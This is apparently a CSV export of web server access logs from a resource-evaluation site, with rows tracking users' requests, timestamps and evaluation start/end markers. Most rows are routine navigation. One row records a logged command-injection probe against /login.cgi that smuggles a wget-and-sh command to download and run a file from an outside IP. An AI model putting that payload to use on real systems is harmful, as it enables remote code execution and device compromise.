,ip,req,timestamp,marker,resourceID
1129,146.203.121.6,GET /project/1/myevaluations/,Thu Jul 19 21:06:45 2018,,
1130,146.203.121.6,GET /project/1/myevaluations/,19/Jul/2018:21:06:47 +0000,,
1131,146.203.121.6,GET /project/1/myevaluations/,Thu Jul 19 21:06:46 2018,,
1132,146.203.121.6,GET /project/1/myevaluations/page/2?,19/Jul/2018:21:06:51 +0000,,
1133,146.203.121.6,GET /project/1/myevaluations/page/2?,Thu Jul 19 21:06:51 2018,,
1134,146.203.121.6,GET /modifyevaluation?resourceid=960,19/Jul/2018:21:06:53 +0000,,960
1135,146.203.121.6,GET /modifyevaluation?resourceid=960,Thu Jul 19 21:06:53 2018,,960
1136,146.203.121.6,GET /modifyevaluation?resourceid=1094,19/Jul/2018:21:06:54 +0000,,1094
1137,146.203.121.6,GET /modifyevaluation?resourceid=1094,Thu Jul 19 21:06:54 2018,,1094
1138,146.203.121.6,GET /modifyevaluation?resourceid=1139,19/Jul/2018:21:06:55 +0000,,1139
1139,146.203.121.6,GET /modifyevaluation?resourceid=1139,Thu Jul 19 21:06:55 2018,,1139
1140,146.203.121.6,GET /modifyevaluation?resourceid=1168,19/Jul/2018:21:06:55 +0000,,1168
1141,146.203.121.6,GET /modifyevaluation?resourceid=1168,Thu Jul 19 21:06:55 2018,,1168
1142,146.203.121.6,GET /modifyevaluation?resourceid=1241,19/Jul/2018:21:06:56 +0000,,1241
1143,146.203.121.6,GET /modifyevaluation?resourceid=1241,Thu Jul 19 21:06:56 2018,,1241
1144,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:07:00 2018,,
1145,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:07:01 +0000,,
1146,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:07:01 +0000,,
1147,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:07:01 2018,,
1148,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:07:06 2018,,
1149,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:07:06 +0000,,
1150,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:07:07 +0000,,
1151,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:07:06 2018,,
1152,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:07:11 2018,,
1153,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:07:11 +0000,,
1154,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:07:11 +0000,,
1155,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:07:11 2018,,
1156,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:07:15 2018,,
1157,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:07:16 +0000,,
1158,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:07:16 +0000,,
1159,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:07:16 2018,,
1160,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:07:19 2018,,
1161,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:07:19 +0000,,
1162,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:07:19 +0000,,
1163,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:07:19 2018,,
1164,146.203.121.6,GET /modifyevaluation?resourceid=1279,19/Jul/2018:21:07:26 +0000,,1279
1165,146.203.121.6,GET /modifyevaluation?resourceid=1279,Thu Jul 19 21:07:26 2018,,1279
1166,146.203.121.6,GET /modifyevaluation?resourceid=1403,19/Jul/2018:21:07:26 +0000,,1403
1167,146.203.121.6,GET /modifyevaluation?resourceid=1403,Thu Jul 19 21:07:26 2018,,1403
1168,146.203.121.6,GET /modifyevaluation?resourceid=1509,19/Jul/2018:21:07:27 +0000,,1509
1169,146.203.121.6,GET /modifyevaluation?resourceid=1509,Thu Jul 19 21:07:27 2018,,1509
1170,146.203.121.6,GET /modifyevaluation?resourceid=1830,19/Jul/2018:21:07:28 +0000,,1830
1171,146.203.121.6,GET /modifyevaluation?resourceid=1830,Thu Jul 19 21:07:28 2018,,1830
1172,146.203.121.6,GET /modifyevaluation?resourceid=1855,19/Jul/2018:21:07:28 +0000,,1855
1173,146.203.121.6,GET /modifyevaluation?resourceid=1855,Thu Jul 19 21:07:28 2018,,1855
1174,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:07:33 2018,,
1175,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:07:33 +0000,,
1176,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:07:33 +0000,,
1177,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:07:33 2018,,
1178,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:07:37 2018,,
1179,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:07:37 +0000,,
1180,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:07:37 +0000,,
1181,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:07:37 2018,,
1182,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:07:41 2018,,
1183,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:07:41 +0000,,
1184,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:07:41 +0000,,
1185,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:07:41 2018,,
1186,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:07:45 2018,,
1187,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:07:45 +0000,,
1188,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:07:45 +0000,,
1189,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:07:45 2018,,
1190,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:07:49 2018,,
1191,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:07:49 +0000,,
1192,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:07:49 +0000,,
1193,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:07:49 2018,,
1194,146.203.121.6,GET /project/1/myevaluations/page/3?,19/Jul/2018:21:07:53 +0000,,
1195,146.203.121.6,GET /project/1/myevaluations/page/3?,Thu Jul 19 21:07:52 2018,,
1196,146.203.121.6,GET /modifyevaluation?resourceid=1925,19/Jul/2018:21:07:55 +0000,,1925
1197,146.203.121.6,GET /modifyevaluation?resourceid=1925,Thu Jul 19 21:07:55 2018,,1925
1198,146.203.121.6,GET /modifyevaluation?resourceid=2147,19/Jul/2018:21:07:55 +0000,,2147
1199,146.203.121.6,GET /modifyevaluation?resourceid=2147,Thu Jul 19 21:07:55 2018,,2147
1200,146.203.121.6,GET /modifyevaluation?resourceid=2183,19/Jul/2018:21:07:56 +0000,,2183
1201,146.203.121.6,GET /modifyevaluation?resourceid=2183,Thu Jul 19 21:07:56 2018,,2183
1202,146.203.121.6,GET /modifyevaluation?resourceid=2377,19/Jul/2018:21:07:56 +0000,,2377
1203,146.203.121.6,GET /modifyevaluation?resourceid=2377,Thu Jul 19 21:07:56 2018,,2377
1204,146.203.121.6,GET /modifyevaluation?resourceid=2439,19/Jul/2018:21:07:57 +0000,,2439
1205,146.203.121.6,GET /modifyevaluation?resourceid=2439,Thu Jul 19 21:07:57 2018,,2439
1206,146.203.121.6,GET /modifyevaluation?resourceid=2485,19/Jul/2018:21:07:57 +0000,,2485
1207,146.203.121.6,GET /modifyevaluation?resourceid=2485,Thu Jul 19 21:07:57 2018,,2485
1208,146.203.121.6,GET /modifyevaluation?resourceid=2649,19/Jul/2018:21:07:58 +0000,,2649
1209,146.203.121.6,GET /modifyevaluation?resourceid=2649,Thu Jul 19 21:07:58 2018,,2649
1210,146.203.121.6,GET /modifyevaluation?resourceid=2679,19/Jul/2018:21:07:58 +0000,,2679
1211,146.203.121.6,GET /modifyevaluation?resourceid=2679,Thu Jul 19 21:07:58 2018,,2679
1212,146.203.121.6,GET /modifyevaluation?resourceid=2681,19/Jul/2018:21:07:59 +0000,,2681
1213,146.203.121.6,GET /modifyevaluation?resourceid=2681,Thu Jul 19 21:07:59 2018,,2681
1214,146.203.121.6,GET /modifyevaluation?resourceid=2718,19/Jul/2018:21:08:00 +0000,,2718
1215,146.203.121.6,GET /modifyevaluation?resourceid=2718,Thu Jul 19 21:08:00 2018,,2718
1216,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:08:05 2018,,
1217,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:08:05 +0000,,
1218,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:08:05 +0000,,
1219,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:08:05 2018,,
1220,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:08:09 2018,,
1221,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:08:09 +0000,,
1222,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:08:09 +0000,,
1223,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:08:09 2018,,
1224,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:08:13 2018,,
1225,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:08:14 +0000,,
1226,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:08:14 +0000,,
1227,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:08:14 2018,,
1228,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:08:17 2018,,
1229,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:08:17 +0000,,
1230,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:08:17 +0000,,
1231,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:08:17 2018,,
1232,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:08:21 2018,,
1233,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:08:21 +0000,,
1234,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:08:21 +0000,,
1235,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:08:21 2018,,
1236,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:08:26 2018,,
1237,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:08:26 +0000,,
1238,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:08:27 +0000,,
1239,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:08:26 2018,,
1240,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:08:30 2018,,
1241,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:08:31 +0000,,
1242,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:08:31 +0000,,
1243,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:08:31 2018,,
1244,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:08:37 2018,,
1245,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:08:37 +0000,,
1246,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:08:37 +0000,,
1247,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:08:37 2018,,
1248,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:08:48 2018,,
1249,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:08:48 +0000,,
1250,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:08:49 +0000,,
1251,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:08:48 2018,,
1252,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:08:55 2018,,
1253,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:08:55 +0000,,
1254,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:08:55 +0000,,
1255,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:08:55 2018,,
1256,146.203.121.6,GET /project/1/myevaluations/page/4?,19/Jul/2018:21:09:06 +0000,,
1257,146.203.121.6,GET /project/1/myevaluations/page/4?,Thu Jul 19 21:09:05 2018,,
1258,146.203.121.6,GET /project/1/myevaluations/page/5?,19/Jul/2018:21:09:07 +0000,,
1259,146.203.121.6,GET /project/1/myevaluations/page/5?,Thu Jul 19 21:09:07 2018,,
1260,146.203.121.6,GET /project/1/myevaluations/page/4?,19/Jul/2018:21:09:10 +0000,,
1261,146.203.121.6,GET /project/1/myevaluations/page/4?,Thu Jul 19 21:09:09 2018,,
1262,146.203.121.6,GET /modifyevaluation?resourceid=2767,19/Jul/2018:21:09:12 +0000,,2767
1263,146.203.121.6,GET /modifyevaluation?resourceid=2767,Thu Jul 19 21:09:12 2018,,2767
1264,146.203.121.6,GET /modifyevaluation?resourceid=2771,19/Jul/2018:21:09:12 +0000,,2771
1265,146.203.121.6,GET /modifyevaluation?resourceid=2771,Thu Jul 19 21:09:12 2018,,2771
1266,146.203.121.6,GET /modifyevaluation?resourceid=2922,19/Jul/2018:21:09:13 +0000,,2922
1267,146.203.121.6,GET /modifyevaluation?resourceid=2922,Thu Jul 19 21:09:13 2018,,2922
1268,146.203.121.6,GET /modifyevaluation?resourceid=2986,19/Jul/2018:21:09:14 +0000,,2986
1269,146.203.121.6,GET /modifyevaluation?resourceid=2986,Thu Jul 19 21:09:14 2018,,2986
1270,146.203.121.6,GET /modifyevaluation?resourceid=3039,19/Jul/2018:21:09:15 +0000,,3039
1271,146.203.121.6,GET /modifyevaluation?resourceid=3039,Thu Jul 19 21:09:15 2018,,3039
1272,146.203.121.6,GET /modifyevaluation?resourceid=3064,19/Jul/2018:21:09:16 +0000,,3064
1273,146.203.121.6,GET /modifyevaluation?resourceid=3064,Thu Jul 19 21:09:16 2018,,3064
1274,146.203.121.6,GET /modifyevaluation?resourceid=3233,19/Jul/2018:21:09:16 +0000,,3233
1275,146.203.121.6,GET /modifyevaluation?resourceid=3233,Thu Jul 19 21:09:16 2018,,3233
1276,146.203.121.6,GET /modifyevaluation?resourceid=3490,19/Jul/2018:21:09:17 +0000,,3490
1277,146.203.121.6,GET /modifyevaluation?resourceid=3490,Thu Jul 19 21:09:17 2018,,3490
1278,146.203.121.6,GET /modifyevaluation?resourceid=3506,19/Jul/2018:21:09:17 +0000,,3506
1279,146.203.121.6,GET /modifyevaluation?resourceid=3506,Thu Jul 19 21:09:17 2018,,3506
1280,146.203.121.6,GET /modifyevaluation?resourceid=3679,19/Jul/2018:21:09:18 +0000,,3679
1281,146.203.121.6,GET /modifyevaluation?resourceid=3679,Thu Jul 19 21:09:18 2018,,3679
1282,146.203.121.6,GET /project/1/myevaluations/page/5?,19/Jul/2018:21:09:19 +0000,,
1283,146.203.121.6,GET /project/1/myevaluations/page/5?,Thu Jul 19 21:09:18 2018,,
1284,146.203.121.6,GET /modifyevaluation?resourceid=3717,19/Jul/2018:21:09:20 +0000,,3717
1285,146.203.121.6,GET /modifyevaluation?resourceid=3717,Thu Jul 19 21:09:20 2018,,3717
1286,146.203.121.6,GET /modifyevaluation?resourceid=3766,19/Jul/2018:21:09:21 +0000,,3766
1287,146.203.121.6,GET /modifyevaluation?resourceid=3766,Thu Jul 19 21:09:21 2018,,3766
1288,146.203.121.6,GET /modifyevaluation?resourceid=3898,19/Jul/2018:21:09:22 +0000,,3898
1289,146.203.121.6,GET /modifyevaluation?resourceid=3898,Thu Jul 19 21:09:22 2018,,3898
1290,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:09:27 2018,,
1291,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:09:28 +0000,,
1292,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:09:28 +0000,,
1293,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:09:28 2018,,
1294,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:09:33 2018,,
1295,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:09:33 +0000,,
1296,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:09:34 +0000,,
1297,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:09:34 2018,,
1298,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:09:38 2018,,
1299,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:09:38 +0000,,
1300,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:09:38 +0000,,
1301,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:09:38 2018,,
1302,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:09:42 2018,,
1303,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:09:43 +0000,,
1304,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:09:43 +0000,,
1305,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:09:43 2018,,
1306,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:09:46 2018,,
1307,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:09:46 +0000,,
1308,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:09:47 +0000,,
1309,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:09:47 2018,,
1310,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:09:51 2018,,
1311,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:09:51 +0000,,
1312,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:09:51 +0000,,
1313,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:09:51 2018,,
1314,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:09:55 2018,,
1315,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:09:55 +0000,,
1316,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:09:55 +0000,,
1317,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:09:55 2018,,
1318,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:09:59 2018,,
1319,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:09:59 +0000,,
1320,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:09:59 +0000,,
1321,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:09:59 2018,,
1322,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:10:03 2018,,
1323,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:10:03 +0000,,
1324,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:10:03 +0000,,
1325,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:10:03 2018,,
1326,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:10:08 2018,,
1327,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:10:08 +0000,,
1328,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:10:08 +0000,,
1329,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:10:08 2018,,
1330,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:10:11 2018,,
1331,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:10:11 +0000,,
1332,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:10:12 +0000,,
1333,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:10:12 2018,,
1334,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:10:15 2018,,
1335,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:10:15 +0000,,
1336,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:10:15 +0000,,
1337,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:10:15 2018,,
1338,146.203.121.6,POST /modifysubmitted,Thu Jul 19 21:10:20 2018,,
1339,146.203.121.6,POST /modifysubmitted,19/Jul/2018:21:10:20 +0000,,
1340,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:10:20 +0000,,
1341,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:10:20 2018,,
1342,146.203.121.6,GET /project/1/resources?,19/Jul/2018:21:10:26 +0000,,
1343,146.203.121.6,GET /project/1/resources?,Thu Jul 19 21:10:26 2018,,
1344,146.203.121.6,GET /newevaluation?resourceid=3249,19/Jul/2018:21:10:30 +0000,evalStart,3249
1345,146.203.121.6,GET /newevaluation?resourceid=3249,Thu Jul 19 21:10:30 2018,evalStart,3249
1346,204.68.92.141,POST /evaluationsubmitted,Thu Jul 19 21:12:13 2018,evalEnd,
1347,204.68.92.141,POST /evaluationsubmitted,19/Jul/2018:21:12:13 +0000,evalEnd,
1348,204.68.92.141,GET /project/1/resources,19/Jul/2018:21:12:13 +0000,,
1349,204.68.92.141,GET /project/1/resources,Thu Jul 19 21:12:13 2018,,
1350,146.203.121.6,POST /evaluationsubmitted,Thu Jul 19 21:12:24 2018,evalEnd,
1351,146.203.121.6,POST /evaluationsubmitted,19/Jul/2018:21:12:25 +0000,evalEnd,
1352,146.203.121.6,GET /project/1/resources,19/Jul/2018:21:12:25 +0000,,
1353,146.203.121.6,GET /project/1/resources,Thu Jul 19 21:12:25 2018,,
1354,204.68.92.141,GET /project/1/myevaluations/,19/Jul/2018:21:12:57 +0000,,
1355,204.68.92.141,GET /project/1/myevaluations/,Thu Jul 19 21:12:57 2018,,
1356,204.68.92.141,GET /project/1/resources?,19/Jul/2018:21:13:00 +0000,,
1357,204.68.92.141,GET /project/1/resources?,Thu Jul 19 21:12:59 2018,,
1358,197.57.81.81,GET /login.cgi?cli=aa%20aa%27;wget%20http://104.244.72.82/k%20-O%20-%3E%20/tmp/k;sh%20/tmp/k%27$,19/Jul/2018:21:18:59 +0000,,
1359,204.68.92.141,GET /project/1/resources?,19/Jul/2018:21:22:27 +0000,,
1360,204.68.92.141,GET /project/1/resources?,Thu Jul 19 21:22:27 2018,,
1361,204.68.92.141,GET /project/1/resources?,19/Jul/2018:21:22:33 +0000,,
1362,204.68.92.141,GET /project/1/resources?,Thu Jul 19 21:22:33 2018,,
1363,204.68.92.141,GET /newevaluation?resourceid=367,19/Jul/2018:21:22:39 +0000,evalStart,367
1364,204.68.92.141,GET /newevaluation?resourceid=367,Thu Jul 19 21:22:39 2018,evalStart,367
1365,204.68.92.141,GET /project/1/myevaluations/,19/Jul/2018:21:24:19 +0000,,
1366,204.68.92.141,GET /project/1/myevaluations/,Thu Jul 19 21:24:19 2018,,
1367,204.68.92.141,GET /project/1/resources?,19/Jul/2018:21:24:21 +0000,,
1368,204.68.92.141,GET /project/1/resources?,Thu Jul 19 21:24:20 2018,,
1369,204.68.92.141,GET /project/1/resources?,19/Jul/2018:21:24:33 +0000,,
1370,204.68.92.141,GET /project/1/resources?,Thu Jul 19 21:24:33 2018,,
1371,204.68.92.141,GET /project/1/resources?,19/Jul/2018:21:24:34 +0000,,
1372,204.68.92.141,GET /project/1/resources?,Thu Jul 19 21:24:34 2018,,
1373,204.68.92.141,GET /newevaluation?resourceid=52,19/Jul/2018:21:25:05 +0000,evalStart,52
1374,204.68.92.141,GET /newevaluation?resourceid=52,Thu Jul 19 21:25:05 2018,evalStart,52
1375,70.42.131.170,GET /project/1/resources,19/Jul/2018:22:04:37 +0000,,
1376,70.42.131.170,GET /project/1/resources,19/Jul/2018:22:04:38 +0000,,
1377,70.42.131.170,GET /project/1/resources,Thu Jul 19 22:04:38 2018,,
1378,70.42.131.170,GET /static/img/icon-32.png,19/Jul/2018:22:04:38 +0000,,
1379,70.42.131.170,GET /evaluationsubmitted,19/Jul/2018:22:06:02 +0000,evalEnd,
1380,70.42.131.170,GET /evaluationsubmitted,Thu Jul 19 22:06:03 2018,evalEnd,
1381,70.42.131.170,GET /evaluationsubmitted,19/Jul/2018:22:06:03 +0000,evalEnd,
1382,70.42.131.170,GET /,19/Jul/2018:22:30:52 +0000,,
1383,70.42.131.170,GET /,Thu Jul 19 22:30:53 2018,,
1384,70.42.131.170,GET /,19/Jul/2018:22:30:53 +0000,,
1385,70.42.131.170,GET /static/img/icon-32.png,19/Jul/2018:22:30:53 +0000,,
1386,178.136.130.29,GET /,19/Jul/2018:23:25:52 +0000,,
1387,177.94.71.229,GET /,19/Jul/2018:23:59:01 +0000,,
1388,70.42.131.170,GET /newevaluation%3fresourceid=1431,20/Jul/2018:00:00:22 +0000,evalStart,1431
1389,70.42.131.170,GET /newevaluation?resourceid=1431,Fri Jul 20 00:00:23 2018,evalStart,1431
1390,70.42.131.170,GET /newevaluation?resourceid=1431,20/Jul/2018:00:00:23 +0000,evalStart,1431
1391,70.42.131.170,GET /login?next=%2Fnewevaluation%3Fresourceid%3D1431,Fri Jul 20 00:00:23 2018,,
1392,70.42.131.170,GET /login?next=%2Fnewevaluation%3Fresourceid%3D1431,20/Jul/2018:00:00:23 +0000,,
1393,70.42.131.170,GET /static/img/icon-32.png,20/Jul/2018:00:00:23 +0000,,
1394,70.42.131.170,GET /project/1/myevaluations,20/Jul/2018:00:29:44 +0000,,
1395,70.42.131.170,GET /project/1/myevaluations,Fri Jul 20 00:29:45 2018,,
1396,70.42.131.170,GET /project/1/myevaluations,20/Jul/2018:00:29:45 +0000,,
1397,70.42.131.170,GET /project/1/myevaluations/,Fri Jul 20 00:29:45 2018,,
1398,70.42.131.170,GET /project/1/myevaluations/,20/Jul/2018:00:29:45 +0000,,
1399,70.42.131.170,GET /login?next=%2Fproject%2F1%2Fmyevaluations%2F,Fri Jul 20 00:29:45 2018,,
1400,70.42.131.170,GET /login?next=%2Fproject%2F1%2Fmyevaluations%2F,20/Jul/2018:00:29:45 +0000,,
1401,70.42.131.170,GET /static/img/icon-32.png,20/Jul/2018:00:29:46 +0000,,
1402,2.187.236.72,GET /,20/Jul/2018:00:37:30 +0000,,
1403,73.112.170.123,GET /,20/Jul/2018:01:44:46 +0000,,
